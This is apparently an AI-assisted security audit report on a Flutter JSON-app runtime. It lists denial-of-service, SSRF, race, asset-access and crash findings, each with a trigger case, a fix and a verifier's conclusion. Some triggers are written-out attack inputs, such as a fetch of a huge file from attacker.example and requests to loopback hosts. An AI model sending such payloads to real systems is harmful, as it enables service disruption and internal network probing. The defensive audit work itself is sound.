**机制**：Every successfully downloaded resource version is written to disk under packages/$name/$version.json and recorded in the index `resources[name].versions[version]`, with no maximum entry count, no size cap, and no eviction/LRU. _findBestLocalMatch keeps all versions forever; clear()/reset() only drop the in-memory index, and disk cleanup is delegated entirely to an external local_data_wiper. Because `name` and `version` are attacker-influenced (dependency keys / registry version strings), an attacker can force the client to materialise arbitrarily many distinct cache files and index entries.

**触发用例**：

```
An attacker with Registry publish access (any user token per CLAUDE.md) publishes N distinct real packages/versions (e.g. mycompany/lib-0001..lib-9999, each a tiny library). Then a JSON App declares them all in "dependencies" (or a rotating series of generated apps each declaring a fresh batch). interpreter.dart:729 → loadDependencies → getResource resolves each via the registry, and _downloadAndCacheResource (cache_manager.dart:229-267) writes one packages/$name/$version.json plus one index.json entry per artifact, with no cap or eviction, growing index.json and disk monotonically across sessions. Note: non-existent dependency names produce NO write (registry returns null), and repeating an already-cached name@version is deduped (lines 180-202), so growth tracks the count of distinct registry-resolvable artifacts.
```

**影响**：Unbounded disk consumption and an ever-growing index.json that must be JSON-decoded on every cache init (cache_manager.dart:37-39), degrading startup and eventually filling device storage — a denial-of-service of the client/device.

**修复建议**：Cap the number of cached versions per resource and total cache size; evict least-recently-used entries; bound the total number of distinct resource names. Optionally prune old versions when latest_version is updated.

<details><summary>对抗验证者核验结论</summary>

The core mechanism is real and verified in /home/fish/ai-app/lib/json_ui/cache_manager.dart. _downloadAndCacheResource (lines 229-267) writes each resolved (name, version) to disk under packages/$name/$version.json (or apps/) and records resources[name].versions[version] in index.json with NO max-entry count, NO size cap, and NO LRU/eviction. reset() (55-59) and clear() only drop the in-memory index; disk cleanup is delegated entirely to an external local_data_wiper (comment line 54). _findBestLocalMatch (282-319) iterates ALL versions forever. This contrasts deliberately with lib/im/im_cache_manager.dart and avatar_widget.dart, which use explicit 200-item/30-day LRU — confirming the DSL cac。…

</details>

---

#### `L9` — No response body size limit on GET/POST — large-body memory DoS

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：medium  
**位置**：`lib/json_ui/http_client.dart:16-24, 45-50, 67-74, 376-383`

**机制**：The dio instance sets timeouts but no maxResponseContentLength / streaming limit for normal GET/POST/PUT/PATCH. dio buffers the full response into memory (response.data) before _buildResult returns it, and the interpreter typically binds it into a DSL variable that is retained. A JSON App can request a very large body from any URL it chooses.

**触发用例**：

```
{"call":"@http_get","args":{"url":"https://attacker.example/10gb.bin"}} — the client buffers the entire body in RAM.
```

**影响**：Memory pressure / OOM from a single request; lower severity because connect/receive timeouts (15s) bound slow transfers, but a fast large payload still lands fully in memory.

**修复建议**：Set BaseOptions/per-request response size limits (dio supports validateStatus + manual streaming with a byte cap) and reject responses whose Content-Length or accumulated bytes exceed a configured maximum.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and I could not find a neutralizing guard. The shared dio instance is constructed in DslHttpClient._internal() (http_client.dart:16-24) with only connect/receive/send timeouts and NO maxResponseContentLength. For GET (get(), lines 39-56) and POST (post(), lines 60-80), the default ResponseType causes dio to buffer the entire body into response.data, which _buildResult (lines 376-383) returns verbatim under the 'data' key. A grep across lib/ found no maxResponseContentLength, no custom HttpClientAdapter/onHttpClientCreate, no streaming cap, and no validateStatus override — so nothing limits buffered body size for the normal verbs. The path is reachable from untrusted JSON: @。…

</details>

---

#### `L10` — _tileForGid linear tileset scan makes per-tile lookup O(num_tilesets); attacker can add many tilesets for quadratic render/collision cost

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：medium  
**位置**：`lib/games/tiled_map_entity.dart:651-656`

**机制**：_tileForGid (line 653-655) linearly scans every tileset to find the one whose firstGid is <= gid (`for (final ts in tilesets) if (gid >= ts.firstGid) tileset = ts;`). It is called once per visible/queried tile in both _renderLayer (line 599) and collisionRectsIn (line 259). An attacker-supplied map can declare a very large number of (inline, image-less) tilesets; every tile lookup then costs O(T) where T is the tileset count, making each frame O(visibleTiles * T). The tilesets list is sorted by firstGid (lines 113/163), so a binary search would be O(log T).

**触发用例**：

```
JSON map declaring thousands of inline tilesets (e.g. 10000 entries each with distinct firstgid and minimal inline data) plus a normal tile layer; every rendered/collided tile then performs a 10000-element scan each frame.
```

**影响**：Sustained per-frame CPU blowup, frame drops / soft DoS proportional to attacker-chosen tileset count. Low because tileset count is also bounded by map JSON size.

**修复建议**：Since tilesets is already sorted by firstGid, replace the linear scan in _tileForGid with a binary search (upper_bound on firstGid).

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and accurately described. `_tileForGid` (/home/fish/ai-app/lib/games/tiled_map_entity.dart:651-656) does an unconditional linear scan over all `tilesets` with no early break: `for (final ts in tilesets) if (gid >= ts.firstGid) tileset = ts;`. It is called once per visible tile in `_renderLayer` (line 599) and once per queried tile in `collisionRectsIn` (line 259), the latter invoked from game_actions.dart per-frame physics/hazard/solid queries (lines 749, 765, 1235, 1740, 1780).

No missed guard. The JSON parse path (`_loadFromJson`, lines 133-162) iterates every entry of `data['tilesets']` and appends to `tilesets` with no length cap. Inline tilesets with no `image` field 。…

</details>

---

#### `L11` — _ParticleStreamCanvas leaks particles across config changes / unbounded radius from JSON

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：low  
**位置**：`lib/json_ui/widgets/visual_primitives_widget.dart:1201-1237, 1429-1448`

**机制**：appendCount is clamped to 500 and maxCount to 12000, but each particle's radius (_num(widget.radius,...)) is unbounded; a config with radius set to a large expression (or driven by 'seq') makes every drawCircle and the radialHighlight radial gradient (1437-1447) operate on a huge radius across up to 12000 particles every frame (shouldRepaint=true). Combined with radialHighlight building a fresh ui.Gradient.radial per particle per frame, this is heavy. Also each particle optionally allocates a new linear gradient shader per frame (1429). Bounded but can be made expensive enough to stall the UI thread.

**触发用例**：

```
{"type":"particle_stream_canvas","maxCount":12000,"appendCount":500,"intervalMs":16,"radius":100000,"radialHighlight":true,"linearLightnessOffset":0.3} — fills the canvas to 12000 particles, each with a 100000px radius; every 16ms the painter (shouldRepaint always true) allocates up to 12000 linear gradients + 12000 radial gradients and issues 24000 canvas-spanning drawCircle calls, causing severe overdraw/allocation jank. NOTE: the original title's "leaks particles across config changes" claim is refuted — didUpdateWidget (1166-1184) clears particles on any config change and dispose cancels the timer.
```

**影响**：Heavy per-frame allocation and overdraw can stall the UI thread on lower-end clients.

**修复建议**：Clamp particle radius to a sane max relative to canvas size, and cap total overdraw/gradient allocations per frame.

<details><summary>对抗验证者核验结论</summary>

The core DoS mechanism is real and reachable from untrusted JSON, but one of the title's two claims is false.

REFUTED — "leaks particles across config changes": didUpdateWidget (lib/json_ui/widgets/visual_primitives_widget.dart:1166-1184) explicitly clears _particles, resets _sequence, and restarts the timer whenever intervalMs/appendCount/maxCount/x/y/radius/hue/saturation/lightness/alpha change. dispose (1187-1190) cancels the timer. So there is NO particle leak across config changes and no lifecycle leak; this part of the finding is wrong.

CONFIRMED — unbounded radius + heavy per-frame work: radius at line 1214 is `_num(widget.radius, vars, 2)` with NO clamp, unlike its siblings alpha/s。…

</details>

---

#### `L12` — Non-http asset paths fall through to rootBundle.load, allowing arbitrary bundled-asset reads from untrusted map references

**类别**：宿主访问 · **边界**：D · **置信度**：medium  
**位置**：`lib/games/tiled_map_entity.dart:842-844`

**机制**：_loadBytes (line 842) delegates to assetManager.loadBytes, which (asset_manager.dart line 49-59) treats any path whose scheme is not http/https as a Flutter rootBundle asset key and calls rootBundle.load(path). A tileset/image `source` from untrusted map data with no scheme (e.g. an arbitrary asset key, or a path with `..` / `assets/secret`) is passed unchecked. While rootBundle is sandboxed to the compiled AssetBundle (not raw host FS), it lets an untrusted JSON App enumerate/read precompiled bundled assets it was never granted (cross-app asset access, capability boundary leak). resolve() (line 37-47) only short-circuits when the URI has a scheme, so schemeless attacker strings reach rootBundle directly.

**触发用例**：

```
tiled_map game entity with inline map_data and a schemeless tileset image key, no base_url: {"type":"flame_game",...,"entities":[{"type":"tiled_map","map_data":{"width":1,"height":1,"tilewidth":16,"tileheight":16,"tilesets":[{"firstgid":1,"image":"assets/icons/Icon-App-1024x1024@1x.png","imagewidth":1024,"imageheight":1024}],"layers":[]}}]}. With base_url omitted and no inline tileset source, effectiveSourceUrl is null, _resolve returns "assets/icons/..." unchanged, and _loadBytes calls rootBundle.load on it — reading a bundled asset key. Note: `..`-style traversal does NOT work (rootBundle does no path resolution); only valid AssetManifest keys load.
```

**影响**：Untrusted JSON App reads precompiled bundle assets outside its intended namespace; weak cross-app/host capability isolation. Low impact because limited to read-only bundled assets, but violates the capability boundary.

**修复建议**：For untrusted Tiled asset references require an absolute http(s) URL or a path confined to the app's own asset namespace; reject schemeless/relative-to-root keys and any path containing '..' before calling rootBundle.load.

<details><summary>对抗验证者核验结论</summary>

The code path is real and reachable as described. Construction site flame_game_engine.dart:760-774 builds TiledMapEntity directly from untrusted `spec`: `source`, `map_data`, and `base_url` are all attacker-controlled and `base_url` is optional. With inline `map_data` (load() line 67 calls _loadFromJson(mapData!) with sourceUrl=null) and a tileset carrying a schemeless `image` (e.g. "assets/icons/Icon-App-1024x1024@1x.png"), _loadFromJson (line 122-127) leaves effectiveSourceUrl=null, _loadTilesetFromJson (line 745-754) calls _resolve(rawImage, relativeTo: null) with baseUrl=null. asset_manager.dart resolve() (line 37-47) only short-circuits on a URI scheme (line 39) and only rewrites when r。…

</details>

---

#### `L13` — @delay-bearing action chain resumes against stale state after loadConfig reload

**类别**：竞态 · **边界**：E · **置信度**：medium · **原始/校准严重度**：medium → low  
**位置**：`lib/json_ui/interpreter.dart:563-594 (loadConfig swaps _config/_variables), 1347-1352, 826-839`

**机制**：loadConfig (lines 563-594) replaces _config and _variables wholesale (and clears stacks/controllers) but does not cancel in-flight awaited builtins. An action or start-step chain containing @delay (or any awaited call) that was launched against config v1 will, when the await resolves, continue executing _executeStep against the freshly loaded v2 _variables. Because @launch_app and ordinary in-app reloads both call loadConfig, a delayed continuation from the previous app/config mutates the new app's variables via setVariable (lines 833-838).

**触发用例**：

```
Single self-reloading app (no second app needed). App start steps or a button action: [{"call":"@delay","args":{"ms":3000}},{"call":"@set","args":{"var":"global.flag","value":true}}]. Within the 3s window, an action fires the in-interpreter builtin @apply_app_config (interpreter.dart:2805-2818), which calls loadConfig(newConfig) (line 2810, swapping _variables at line 573) then executeSteps(). When the original @delay (line 1347-1352) resolves, executeSteps' captured-old-steps loop (lines 733-738) resumes and the trailing @set runs setVariable (lines 826-839), which writes into the freshly-swapped _variables and calls notifyListeners(). @launch_app's loadConfig path also triggers it but is implemented in the caller per the convention comment at lines 152-165; @apply_app_config is the fully in-interpreter, untrusted-JSON-reachable trigger.
```

**影响**：Stale continuation from app/config v1 silently writes into v2 state and rebuilds it — same isolation break as the popState case but via the reload path, which has no snapshot to even theoretically restore to.

**修复建议**：Same epoch/generation guard as finding #1; bump the epoch in loadConfig and have _executeStep/setVariable short-circuit when the captured epoch is stale.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified against real code. loadConfig (563-594) reassigns the instance field _variables = _deepCopy(...) at line 573 and clears the loop/params/event/nav stacks and controllers, but performs NO cancellation of in-flight awaited builtin chains — the only async teardown is _imInboxSub.cancel() (593) / pause() (625). I grepped the whole file: no epoch/generation/_configVersion/_loadGen/_disposed token exists, so there is no guard the reviewer missed. @delay (1347-1352) is a bare await Future.delayed with no token. executeSteps (724-745) and the inner control-flow loops (_builtinIf 2858, while 2876, forEach 2896) all `await _executeStep` and then continue iterating a steps list captur。…

</details>

---

#### `L14` — setState scheduled after async file load can race with rebuild during teardown

**类别**：竞态 · **边界**：E · **置信度**：medium  
**位置**：`lib/json_ui/widgets/rive_animation_widget.dart:130-144`

**机制**：_load() guards with 'if (!mounted) return;' (line 130, 138) before calling setState, which is the correct pattern. However, the loader can change between the await on line 129 and the setState: didUpdateWidget (line 104-114) disposes the old _loader and creates a new one plus a new in-flight _load() while a prior _load() is still awaiting. The earlier _load()'s awaited file() resolves against the now-disposed loader's future and then runs setState assigning _controller, which can clobber the controller produced by the newer load (no per-load token/generation check). This is a last-writer-wins race on rapid src changes.

**触发用例**：

```
Rapidly toggling json['src'] (e.g. two @set calls in quick succession switching between src A and src B) launches two overlapping _load() futures; whichever resolves last wins and may install a controller for a stale src, or dispose a freshly-set controller via the _controller?.dispose() on line 133.
```

**影响**：Visual/state inconsistency (stale Rive artboard shown) and possible disposal of the active controller, leading to a blank or wrong animation. Not a memory-safety escape; bounded impact, hence low.

**修复建议**：Track a monotonically increasing load generation/token captured before await; after await, bail if the current generation no longer matches (in addition to the mounted check) before mutating _controller.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and accurately described. In _RiveAnimationView (file /home/fish/ai-app/lib/json_ui/widgets/rive_animation_widget.dart):

- didUpdateWidget (lines 104-114) fires on any src/renderer change: it disposes _controller, nulls it, disposes _loader, creates a fresh loader, and launches a new _load(). It does NOT cancel/await the in-flight prior _load().
- _load() (lines 123-145) calls `await _loader.file()` (line 129). For an http/https src this awaits real network latency, so a prior _load()'s Future can still be pending when didUpdateWidget triggers a second _load().
- The only post-await guard is `if (!mounted) return;` (lines 130, 138). There is NO per-load generation/toke。…

</details>

---

#### `L15` — @launch_app market/dependency loads config from Registry download_url with no integrity check and preferLatest downgrade/substitution

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：high · **原始/校准严重度**：medium → low  
**位置**：`lib/json_ui/cache_manager.dart:147-280`

**机制**：_launchApp (launcher_bridges.dart 226-300) resolves a market/dependency app via CacheManager.getResource(..., preferLatest:true). getResource -> _downloadAndCacheResource builds the resolve URL by string-interpolating `name` UNENCODED (cache_manager.dart:155: `/resolve?name=$name&version=...`), then takes data['download_url'] from the Registry response and fetches it directly (line 207) with NO allowlist, NO host pinning, NO hash/signature verification. The downloaded JSON is cached and executed as a full app (loadConfig+executeSteps). preferLatest:true means @launch_app market always takes whatever the Registry currently returns for the name with constraint ^version (line 234-242) — a compromised/MITM'd Registry or a name collision serves a substituted/downgraded app. `name` injection (line 155) lets a crafted name add query params to the resolve call.

**触发用例**：

```
No untrusted-JSON-only trigger reaches an attacker host. The real precondition is a malicious/namespaced publisher whose Registry resolve response returns download_url pointing off the trusted object-store host (or a MITM/compromised Registry over the wire). Given such a record, {"call":"@launch_app","args":{"kind":"market","name":"<that-name>","version":"1.0.0"}} causes the client to fetch and execute the substituted body with no hash/signature check. The "name=victim&download_url_override=..." injection only adds query params to the fixed-host Registry /resolve call; it cannot point the fetch at a new host.
```

**影响**：SSRF (client fetches arbitrary download_url), code/app substitution and version downgrade, and query injection into the resolve endpoint. Untrusted JSON chooses which remote app body gets executed inside the capability boundary with no integrity gate.

**修复建议**：URL-encode name in the resolve query; validate download_url against an allowlist of trusted Registry/object-store hosts; verify a content hash/signature from the resolve response before caching/executing; do not silently trust preferLatest for cross-app launch — pin to the requested version and reject host mismatches.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and accurately cited. cache_manager.dart:155 interpolates `name` UNENCODED into the resolve query (version IS encoded with Uri.encodeComponent, name is not). cache_manager.dart:174/207 takes data['download_url'] from the Registry response and fetches it via _httpClient.get with NO host allowlist, NO scheme/host pinning, and NO hash/signature verification; http_client.dart confirms DslHttpClient.get applies no allowlist and Dio follows redirects by default. The fetched JSON is json.decode'd and, in launcher_bridges.dart _launchApp (313-314), executed via loadConfig+executeSteps. preferLatest:true (launcher_bridges 241/289) means market/dependency launch always takes the Regi。…

</details>

---

#### `L16` — @tiled.load fetches arbitrary attacker-controlled http(s) map/tileset/image URLs (SSRF) from in-game logic

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：medium · **原始/校准严重度**：medium → low  
**位置**：`lib/games/game_actions.dart:685-700`

**机制**：@tiled.load takes a 'source' string and calls TiledMapEntity.loadSource(source), which resolves via JsonAppAssetManager and, for any http/https URL, performs a GET through AssetCache (asset_manager.dart:51, asset_cache.dart:100). The URL is fully attacker-controlled and unconstrained, and TMX/JSON map loading then chains further fetches for referenced tilesets/images (tiled_map_entity.dart:682-754), each also resolved against attacker-influenced base URLs. This lets pure in-game JSON logic drive GET requests to internal/loopback/metadata hosts.

**触发用例**：

```
{"call":"@tiled.load","args":{"map":"lvl","source":"http://127.0.0.1:9000/buckets"}} works against a TiledMapEntity 'lvl'; but the same (and more) is achievable already via {"call":"@http_get","args":{"url":"http://127.0.0.1:9000/buckets"}}, which additionally returns the response body to JSON logic.
```

**影响**：SSRF reachable from inside the game sandbox; fan-out fetches to attacker-chosen internal endpoints.

**修复建议**：Route tiled source loads through the same egress allowlist/host policy as other HTTP capabilities; reject loopback/link-local/internal hosts and disallow protocol-relative/scheme-bearing sources not on the app's asset origin.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and reachable. @tiled.load (game_actions.dart:685-700) calls TiledMapEntity.loadSource(source) with a fully attacker-controlled string. load() (tiled_map_entity.dart:59-91) resolves it via _resolve → JsonAppAssetManager.resolve, which passes any scheme-bearing URL through unchanged (asset_manager.dart:37-47, "if (uri.hasScheme) return path"), then loadBytes (asset_manager.dart:49-59) fetches any http/https URL through AssetCache.getBytes, which does _http.get(uri, headers) with NO host allowlist, loopback rejection, or link-local/metadata guard (asset_cache.dart:99-103). Tileset/image references chain further fetches (tiled_map_entity.dart:682-754). So untrusted in-game。…

</details>

---

#### `L17` — No central URL allowlist — each launcher bridge / cache fetch does raw http to arbitrary hosts

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：medium  
**位置**：`lib/json_ui/builtins/launcher_bridges.dart:162-203, 215-343`

**机制**：@market_list (162-203) does http.get against AppConfig.registryUrl with attacker-influenced query params and no allowlist; @launch_app delegates to CacheManager which fetches a Registry-supplied download_url (cache_manager.dart:207) directly. There is no single chokepoint validating that outbound requests stay within trusted hosts, and no guard against loopback/internal addresses for the download_url. This is the systemic enabler for the SSRF finding above and means any future bridge inherits the same gap.

**触发用例**：

```
A malicious package published/served by the Registry whose /resolve response sets download_url to http://127.0.0.1:&lt;port&gt;/... causes the client to issue an unauthenticated GET to that loopback/internal host when an app calls @launch_app({kind:"market",name:"&lt;pkg&gt;"}) or resolves a dependency (cache_manager.dart:207). Note download_url is NOT directly settable from the untrusted JSON-App — it must come back from the trusted Registry, so reaching an internal URL requires Registry-side abuse, not pure client-side JSON control.
```

**影响**：Reach internal/loopback services, potential credential/header leakage to attacker-chosen hosts, no defense-in-depth chokepoint.

**修复建议**：Introduce a single egress policy that all bridges and CacheManager downloads route through: allowlist registry/object-store hosts, block private/loopback/link-local IP ranges, and forbid redirects to off-allowlist hosts.

<details><summary>对抗验证者核验结论</summary>

Mechanism is partly real, partly misread. CONFIRMED facts: (1) cache_manager.dart:207 fetches a Registry-supplied download_url with zero host validation; (2) there is no central egress allowlist, loopback/link-local block, or redirect cap anywhere in lib/json_ui (grep found none); Dio follows redirects by default. So the defense-in-depth gap described is genuine.

REFUTED / overstated parts: (a) @market_list (lines 162-203) does NOT do http to an attacker-influenced HOST — the host is the fixed trusted AppConfig.registryUrl; only the type/search query params are attacker-controlled and they are safely URL-encoded via Uri.replace(queryParameters:). No SSRF there, so citing it as part of the S。…

</details>

---

#### `L18` — GameWorld grid with cols:0/rows:0 -> division producing Infinity/NaN, propagated into .floor() crash and broken render math

**类别**：类型/崩溃 · **边界**：B · **置信度**：high · **原始/校准严重度**：medium → low  
**位置**：`lib/games/game_world.dart:50-51, 58-60, 67-73`

**机制**：GameWorld.fromJson reads cols/rows from untrusted JSON via (json['cols'] as num?)?.toInt() ?? 1 with no lower-bound clamp (lines 39-40). resize() (lines 50-51) computes cellW = w / cols and cellH = h / rows for kind=='grid'. With cols:0 the result is double Infinity (w>0) or NaN (w==0, 0/0). cellTopLeft/cellCenter (lines 58-60) then multiply coordinates by Infinity/NaN, and pixelToCell (lines 67-72) computes (px / cellW).floor() — calling .floor() on a NaN double throws UnsupportedError ('NaN.floor()'), and .clamp(0, cols-1) with cols-1 == -1 makes clamp(0,-1) throw ArgumentError (lowerLimit > upperLimit). Negative cols (e.g. cols:-5) also yields negative cell sizes and a clamp(0,-6) ArgumentError on every tap hit-test. Reached from flame_game_engine.dart:150 gameWorld.resize(...) on every onGameResize, and game_entity.dart:61/143 cellTopLeft + pixelToCell on tap.

**触发用例**：

```
flame_game JSON-App world {"kind":"grid","cols":0,"rows":10}: onGameResize sets cellW=Infinity; a grid (CellEntity) render then calls cellTopLeft(0,y)=Offset(0*Infinity=NaN,...) -> drawShape -> canvas.drawRect(NaN rect). This throws an assertion ONLY in debug builds; in release/profile it is a silent no-op (broken geometry). The pixelToCell-based floor()/clamp(0,-1) crashes cited in the original trigger are NOT reachable — pixelToCell has no caller.
```

**影响**：Untrusted JSON crashes the game widget / render loop (uncaught exception in Flame update/render or tap handler), a DoS of the rendering surface; broken (NaN/Infinity) geometry can also wedge the canvas.

**修复建议**：In fromJson clamp cols/rows to a sane positive range, e.g. cols = ((json['cols'] as num?)?.toInt() ?? 1).clamp(1, 4096). In resize guard divisor (cellW = cols > 0 ? w/cols : 1). In pixelToCell guard cellW/cellH finiteness and clamp upper bound to (cols-1).clamp(0, ...) so the clamp limits are never inverted.

<details><summary>对抗验证者核验结论</summary>

The structural observation is correct: GameWorld.fromJson (lines 39-40) applies no lower-bound clamp to cols/rows, and resize() (lines 50-51) computes cellW=w/cols, cellH=h/rows, so cols:0 yields cellW=Infinity (or NaN if w==0). That much is real and reachable — flame_game_engine.dart:121 parses spec['world'] from untrusted JSON and :150 calls resize on every onGameResize.\n\nHowever the finding's most concrete and severe trigger — tap -> pixelToCell -> (px/cellW).floor() UnsupportedError / .clamp(0, cols-1) ArgumentError — is wrong: pixelToCell is never invoked (verified by grep; the tap handler runs a JSON logic action instead). The clamp(0,-1) and floor()-on-NaN ArgumentError/UnsupportedE。…

</details>

---

#### `L19` — @list_sort comparator can throw on mixed Comparable types (e.g. int vs String) -> sort crash

**类别**：类型/崩溃 · **边界**：B · **置信度**：medium  
**位置**：`lib/json_ui/interpreter.dart:2348-2358`

**机制**：The key comparator does `if (va is Comparable && vb is Comparable) cmp = va.compareTo(vb);`. When the list holds heterogeneous Comparable values (a key that is an int in one element and a String in another — common in untrusted/AI-generated or HTTP-sourced lists), `(2 as Comparable).compareTo('x')` throws a type error inside List.sort, aborting the action. The framework must tolerate any legal JSON list.

**触发用例**：

```
global.items = [{"k":1},{"k":"a"}] then `{"call":"@list_sort","args":{"var":"global.items","key":"k"}}`.
```

**影响**：Action crash on legal JSON data; minor DoS / stability violation.

**修复建议**：Wrap comparisons so unlike runtime types fall back to string compare: only use va.compareTo(vb) when va.runtimeType == vb.runtimeType, else compare toString(); or wrap the sort in try/catch.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and accurately described. At /home/fish/ai-app/lib/json_ui/interpreter.dart:2348-2358, the @list_sort key comparator does `if (va is Comparable && vb is Comparable) cmp = va.compareTo(vb);`. In Dart, `int.compareTo` has signature `int compareTo(num other)` and `String.compareTo` expects a String, so for the trigger list `[{"k":1},{"k":"a"}]` both elements' key values are Comparable but of incompatible runtime types; `(1 as int).compareTo("a")` throws a TypeError inside List.sort. There is no numeric coercion — values are read raw via `a[sortKey]` (line 2349-2350) directly from decoded JSON, so int stays int and String stays String. The trigger reaches the heterogeneous-Comp。…

</details>

---

## 4. 修复优先级建议

| 优先级 | 动作 | 对应发现 |
|--------|------|----------|
| **P0 立刻** | `@get_auth_token`/`@get_user_info` 加 per-app 用户授权或移除直接暴露；token 改由 Dio 拦截器**仅对后端白名单 host** 注入；`_resolveUrl` 加 scheme allowlist + 内网/loopback/link-local denylist（DNS 解析后复检） | C1, H 区 SSRF 项 |
| **P1 高** | 统一「不可信输入消毒层」：文件名/包名拒 `..` 与分隔符并做 canonical 包含校验；执行加硬上限（函数递归深度、`@launch_app` 嵌套、`@loop_by_num`/`@while`、tick interval 钳值、实体/音频数量） | 路径穿越项、递归项、循环/嵌套项、tick/scroll_list 项 |
| **P2 中** | `pushState/popState` 补齐快照（flame handler 列表 / `_activeModalCount` / 生命周期 / 未决 `@delay`）；引入 app-epoch 令跨代写入失效；依赖下载加完整性/签名校验 | 跨应用状态破坏项、`@delay` 竞态项、供应链项 |
| **P3 稳健** | `_toInt`/数值算子 `isFinite` 兜底、除零钳值、`_parseColor` try-catch、blur sigma/字符串/分配上限 —— 落实「框架容忍任意合法 JSON」原则 | 各 `type-crash` / 渲染 DoS 项 |

---

## 5. 附录 A：已核实为「安全 / 误报」的项（对抗验证驳回）

两轮对抗验证共驳回 **30 条**初步发现（已有 guard、与确认项重复、或低置信推测），列举以增强可信度：

**值得注意的「安全确认」**：`flame_game_widget` 生命周期处理正确（`dispose` 中按实例 `unregister` 且检查 `mounted`）—— 常见的「注册泄漏」在此**不成立**；computed-key 有 `_computingNow` 递归保护；`sqrt` 已 `max(0,...)` 钳值；相对 URL 仅改写到可信后端。

- ~~@random throws RangeError when (max-min+1) exceeds 2^32~~ (`interpreter.dart:2120-2124`) — The raw mechanism is accurate: line 2124 computes `min + Random().nextInt(max - min + 1)` with no clamp; _toInt (3756-3761) parses 9999999999 to a full 64-bit int, so nextInt(10000000000) throws Range
- ~~resolveTemplate regex {{(.+?)}} is greedy across braces and diverges from resolveExpression's [^{}] rule~~ (`interpreter.dart:920 vs 1014`) — The reviewer's central claim — that resolveTemplate and resolveExpression "parse the same string differently" for input like `{{ a {{ b }} }}` — is false. I traced the actual code:

resolveExpression 
- ~~@apply_app_config lets untrusted JSON hot-swap the entire running config (re-loadConfig + executeSteps)~~ (`interpreter.dart:2805-2818 (@apply_app_config)`) — The mechanism at interpreter.dart:2805-2818 is real: @apply_app_config takes a `config` map from args, calls loadConfig(newConfig) (line 2810), then await executeSteps() (2812), with no validation; ex
- ~~IM inbox subscription can fire setVariable/notifyListeners after a parent-app loadConfig/pushState mismatch~~ (`interpreter.dart:2768-2796 (@im_subscribe_inbox), 3878-3904 (dispose)`) — The finding posits two race windows where a late IM stream callback writes global._im into the wrong app's _variables map. Both require a stream event to interleave WITH the synchronous state-transiti
- ~~@parallel swallows nothing but leaves sibling branches running after the first failure (Future.wait error semantics)~~ (`interpreter.dart:2951-2961 (_builtinParallel)`) — The code is read accurately: _builtinParallel (interpreter.dart:2951-2961) collects step futures into `futures` and calls `await Future.wait(futures)` with no `eagerError`, so on the first error the r
- ~~@apply_app_config calls loadConfig while nested (after @launch_app pushState) without re-pushing, silently destroying parent state~~ (`interpreter.dart:2805-2818 (loadConfig 563-612, pushState/popState contract 150-166)`) — The finding's central mechanism does not hold against the actual code. Traced the full path in /home/fish/ai-app/lib/json_ui/interpreter.dart and /home/fish/ai-app/lib/json_ui/builtins/launcher_bridge
- ~~computed-key shadow check in _buildDataContext diverges from getVariable, producing inconsistent resolution of {{ }} vs {"var":...}~~ (`interpreter.dart:412-440 (computed shadow at 421) vs getVariable 785-796`) — The finding's central claimed divergence is factually wrong. I traced all three access forms against the real code.

1. {{ global.total }} (template): resolveExpression -> getVariable("global.total") 
- ~~getTextController schedules a post-frame callback that touches the controller without a disposed/mounted guard → use-after-dispose crash on app switch~~ (`interpreter.dart:1036-1057 (callback 1043-1050); dispose path loadConfig 583-586 / dispose 3899-3902`) — The code matches the citation exactly: getTextController (interpreter.dart:1043-1050) captures `controller` in an addPostFrameCallback that later sets `.text`/`.selection` with no disposed/mounted che
- ~~JSON-controlled request headers survive cross-host redirects (credential leak + header injection)~~ (`http_client.dart:39-49, 60-72, 209-224`) — I confirmed the code matches the description: lib/json_ui/http_client.dart constructs a shared singleton _dio (lines 16-24) with no followRedirects/maxRedirects override, and every verb passes caller-
- ~~Relative URLs are silently rewritten to the trusted backend, enabling backend-targeted requests with attacker headers/body~~ (`http_client.dart:31-34`) — The mechanism (relative-URL rewriting) is real — _resolveUrl at http_client.dart:31-34 does prepend AppConfig.backendUrl to scheme-less URLs and treat `//` as https. But the finding's security impact 
- ~~Legacy dependency `url` field allows direct SSRF to arbitrary/internal hosts (resolution path bypass)~~ (`dependency_loader.dart:70-76`) — The finding does not establish a reachable SSRF from untrusted JSON through the dependency loader. Two sub-claims, both refuted:

1) Legacy `spec.url` SSRF. DependencySpec.fromJson (dependency_loader.
- ~~Concurrent dependency downloads race on shared mutable index, losing entries / corrupting index.json~~ (`cache_manager.dart:246-267`) — The concurrent path is real and reachable (untrusted JSON with multiple cache-miss deps → dependency_loader.dart:134-136 Future.wait → concurrent _downloadAndCacheResource → shared _indexCache mutatio
- ~~Stale-while-revalidate trusts local cache without verifying it still satisfies/maps to a real version~~ (`cache_manager.dart:101-126`) — The finding's asserted impact — cross-app cache poisoning where "one JSON App can influence the dependency code another JSON App loads" — does not hold against this code.

What is TRUE: on a local-cac
- ~~Semver parser silently coerces malformed/huge version strings, enabling incorrect constraint satisfaction~~ (`semver.dart:12-20`) — The mechanical claims are partly accurate: SemVer.parse (semver.dart:12-20) uses `int.tryParse(...) ?? 0` and `.split('.')`, so non-numeric components and prerelease/build metadata are silently coerce
- ~~Grid world with cols/rows = 0 crashes via clamp(0, -1) and division by zero~~ (`game_world.dart:67-73`) — Both crash mechanisms in the finding are unreachable. (1) The clamp(0,-1) ArgumentError lives only inside pixelToCell, which has no callers anywhere in the codebase (verified by grep over lib/ and JSO
- ~~Position/velocity/size accept NaN and Infinity from JSON, poisoning physics and render~~ (`flame_game_engine.dart:868-872`) — The INPUT mechanism is real and reachable: _readDouble at /home/fish/ai-app/lib/games/flame_game_engine.dart:868-872 does `double.tryParse(value.trim())`, which in Dart parses "NaN"/"Infinity"/"-Infin
- ~~_imageCache and per-asset network loads are never released; spawned-entity image loads can fire after removal~~ (`flame_game_engine.dart:935-952`) — The finding's central mechanism — "decoded ui.Image objects accumulate in _imageCache across resets" — is a misread of putIfAbsent. The cache is keyed by the asset string (line 1021), so the trigger (
